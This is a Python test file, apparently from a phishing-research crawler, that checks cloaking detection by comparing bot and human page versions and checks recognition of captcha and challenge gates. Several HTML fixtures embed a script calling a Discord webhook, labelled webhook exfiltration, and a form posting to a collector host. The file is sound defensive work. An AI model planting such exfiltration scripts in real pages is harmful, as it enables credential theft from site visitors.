"""C1–C5 機制集合差（analysis/cloaking.decide_cloaking）與閘門偵測。

decide_cloaking 從 v1/v2 原樣搬移（AST 相同），這裡的情境也原樣保留：它們定義的是
「規則結果」（rule_cloaking_label）。最終標籤還要經過閘門，測在 test_cloaking_labels.py。
"""
from analysis.cloaking import _similarity_score, _structural_divergence, decide_cloaking
from crawler.records import detect_gates
from support import CLEAN, LOGIN_PAGE, MALICIOUS, URL


def _r(html, *, status=200, error=None, chain=None, text=None):
    return {"html": html, "status_code": status, "error": error,
            "text_content": text if text is not None else ("x" * 200 if html else ""),
            "html_length": len(html), "redirect_chain": chain or [URL], "title": "", "final_url": URL}


def test_bot_clean_human_malicious_is_cloaking():
    v = decide_cloaking(_r(CLEAN), _r(MALICIOUS), URL)
    assert v["verified"] and "C1" in v["fired"], v["evidence"]
    assert not v["bot_mechanisms"]
    assert "webhook_exfiltration" in v["hidden_from_bot"]
    assert v["human_eval"]["is_phishing"] and not v["bot_eval"]["is_phishing"]


def test_both_malicious_is_phishing_not_cloaking():
    v = decide_cloaking(_r(MALICIOUS), _r(MALICIOUS), URL)
    assert not v["verified"] and not v["hidden_from_bot"]
    assert any("未對爬蟲隱藏" in e for e in v["evidence"]), v["evidence"]


def test_both_clean_is_not_cloaking():
    v = decide_cloaking(_r(CLEAN), _r(CLEAN), URL)
    assert not v["verified"]
    assert any("兩端皆未偵測到惡意機制" in e for e in v["evidence"]), v["evidence"]


def test_text_difference_alone_is_not_cloaking():
    """文字完全不同但兩端都沒有惡意機制 → 相似度法會誤報"""
    zh = "<html><body><h1>歡迎光臨</h1><p>本站提供最新產品資訊與線上訂購服務。</p></body></html>"
    en = "<html><body><h1>Welcome</h1><p>Latest products and online ordering.</p></body></html>"
    v = decide_cloaking(_r(zh, text="歡迎光臨 本站提供最新產品資訊與線上訂購服務。"),
                        _r(en, text="Welcome Latest products and online ordering."), URL)
    assert v["content_similarity"] < 0.5
    assert not v["verified"], v["evidence"]


def test_identical_text_with_hidden_mechanism_is_cloaking():
    """文字幾乎相同但 HUMAN 多一支外洩腳本 → 相似度法會漏報"""
    base = "<html><body><h1>Sign in</h1><p>Enter your credentials below.</p>{}</body></html>"
    v = decide_cloaking(_r(base.format(""), text="Sign in Enter your credentials below."),
                        _r(base.format("<script>fetch('https://discord.com/api/webhooks/1/abc');</script>"),
                           text="Sign in Enter your credentials below."), URL)
    assert v["content_similarity"] > 0.95
    assert v["verified"] and "webhook_exfiltration" in v["hidden_from_bot"]


def test_bot_blocked_with_malicious_human_is_cloaking():
    v = decide_cloaking(_r("", status=403), _r(MALICIOUS, status=200), URL)
    assert v["verified"] and "C2" in v["fired"], v["evidence"]


# ── 反爬蟲 ≠ Cloaking：C2–C4 只證明差別待遇，要配高特異性機制才算 ──────
def test_bot_blocked_with_plain_login_page_is_not_cloaking():
    v = decide_cloaking(_r("", status=403), _r(LOGIN_PAGE, status=200), URL)
    assert v["human_mechanisms"], "測試前提：這頁本來就該命中頁面特徵類機制"
    assert not v["verified"]
    assert any("反爬蟲" in e for e in v["evidence"]), v["evidence"]


def test_c1_still_uses_the_full_mechanism_set():
    """C1 比兩端差異，仍用完整集合 —— BOT 看不到登入表單而 HUMAN 看得到本身就有意義。"""
    v = decide_cloaking(_r(CLEAN), _r(LOGIN_PAGE), URL)
    assert v["verified"] and "C1" in v["fired"] and "cred_form" in v["hidden_from_bot"]


def test_bot_blocked_but_clean_human_is_not_cloaking():
    v = decide_cloaking(_r("", status=403), _r(CLEAN, status=200), URL)
    assert not v["verified"] and any("反爬蟲" in e for e in v["evidence"])


def test_http2_reset_but_clean_human_is_not_cloaking():
    v = decide_cloaking(_r("", error="ERR_HTTP2_PROTOCOL_ERROR"), _r(CLEAN), URL)
    assert not v["verified"] and any("反爬蟲" in e for e in v["evidence"])


def test_http2_reset_with_malicious_human_is_cloaking():
    v = decide_cloaking(_r("", error="ERR_HTTP2_PROTOCOL_ERROR"), _r(MALICIOUS), URL)
    assert v["verified"] and "C3" in v["fired"], v["evidence"]


def test_empty_bot_page_but_clean_human_is_not_cloaking():
    assert not decide_cloaking(_r("", text=""), _r(CLEAN), URL)["verified"]


def test_empty_bot_page_with_malicious_human_is_cloaking():
    v = decide_cloaking(_r("", text=""), _r(MALICIOUS), URL)
    assert v["verified"] and "C4" in v["fired"], v["evidence"]


def test_redirect_fork_without_mechanism_diff_is_not_cloaking():
    v = decide_cloaking(_r(CLEAN, chain=[URL, "https://us.example.com/home"]),
                        _r(CLEAN, chain=[URL, "https://tw.example.com/home"]), URL)
    assert not v["verified"] and any("地理/裝置導向" in e for e in v["evidence"])


def test_reverse_diff_is_recorded_but_never_decides():
    leaky = "<html><body><script>fetch('https://discord.com/api/webhooks/1/abc');</script></body></html>"
    v = decide_cloaking(_r(leaky), _r(CLEAN), URL)
    assert "webhook_exfiltration" in v["reverse_diff"]
    assert not v["hidden_from_bot"] and v["verified"] is False


# ── 結構分歧：純描述，不裁決 ─────────────────────────────────────
_DIV_BOT = ('<html><body><form action="https://cdn-a.example.com/search"><input name="q"></form>'
            '<script src="https://cdn-a.example.com/app.js"></script></body></html>')
_DIV_HUMAN = ('<html><body><form action="https://collector.example.net/next.php"><input name="q"></form>'
              '<script src="https://tracker.example.net/x.js"></script></body></html>')


def test_structural_divergence_is_described():
    assert _structural_divergence(_DIV_BOT, _DIV_HUMAN)
    assert _structural_divergence(_DIV_BOT, _DIV_BOT) == []


def test_multilingual_same_structure_is_not_divergent():
    """相似度低但結構相同 → 不是結構分歧（相似度不得塞進任何判定條件）。"""
    shell = ('<html><body><h1>{}</h1><p>{}</p><form action="https://shop.example.com/search">'
             '<input name="q"></form><script src="https://cdn.example.com/app.js"></script></body></html>')
    zh = shell.format("歡迎光臨", "本站提供最新產品資訊與線上訂購服務。")
    en = shell.format("Welcome", "Latest products and online ordering.")
    assert _similarity_score("歡迎光臨 本站提供最新產品資訊與線上訂購服務。",
                             "Welcome Latest products and online ordering.") < 0.5
    assert _structural_divergence(zh, en) == []


# ── 閘門與挑戰頁：唯一一份規則表 ─────────────────────────────────
def test_gate_patterns_cover_crawlphish_categories():
    """CrawlPhish 的 User Interaction 各子類都要能被認出來"""
    cases = {"captcha": '<div class="g-recaptcha"></div>',
             "notification": "<script>Notification.requestPermission()</script>",
             "alert_gate": '<script>alert("please wait")</script>',
             "click_gate": "<button onclick=\"document.getElementById('x').style.display='block'\">Continue</button>"}
    for name, html in cases.items():
        assert name in detect_gates(html), (name, html)
    assert detect_gates(CLEAN) == []


def test_captcha_is_only_captcha():
    assert detect_gates('<div class="g-recaptcha"></div>') == ["captcha"]


def test_challenge_page_detected_from_markup_and_text():
    page = "<html><head><title>Just a moment...</title></head><body>Checking your browser</body></html>"
    assert "challenge" in detect_gates(page)


def test_noscript_and_cloudflare_jsd_are_not_challenges():
    """v2 把這兩種一般頁面元素當成挑戰頁，SPA 與掛 Cloudflare 的正常頁全部變 unknown。"""
    spa = ('<html><body><noscript>You need to enable JavaScript to run this app.</noscript>'
           '<div id="root"></div><script src="/cdn-cgi/challenge-platform/scripts/jsd/main.js"></script>'
           '</body></html>')
    assert detect_gates(spa, text="") == []


def test_alert_word_in_prose_is_not_a_gate():
    """alert( 只在腳本與事件屬性裡算數；文章裡的「prompt (below)」不是閘門。"""
    prose = "<html><body><p>Follow the prompt (below) and read the alert (if any).</p></body></html>"
    assert detect_gates(prose, text="Follow the prompt (below) and read the alert (if any).") == []
